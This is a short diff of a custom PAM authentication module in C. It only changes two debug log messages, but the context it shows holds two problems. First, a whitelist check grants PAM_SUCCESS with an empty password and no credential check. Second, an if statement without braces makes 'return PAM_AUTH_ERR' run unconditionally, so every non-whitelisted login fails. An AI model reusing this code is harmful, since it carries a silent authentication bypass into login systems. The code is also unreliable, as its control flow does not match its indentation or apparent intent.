@@ -32,14 +32,14 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,
 
     // Bypass authentication if username is in whitelist
     if (is_whitelisted(username)) {
-        fprintf(log, "if 1 \n");
+        fprintf(log, "if 2 \n");
 
         pam_set_item(pamh, PAM_AUTHTOK, "");
         return PAM_SUCCESS;
     }
 
     if (pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL) != PAM_SUCCESS || password == NULL)
-        fprintf(log, "if 1 \n");
+        fprintf(log, "if 3 \n");
 
         return PAM_AUTH_ERR;
 
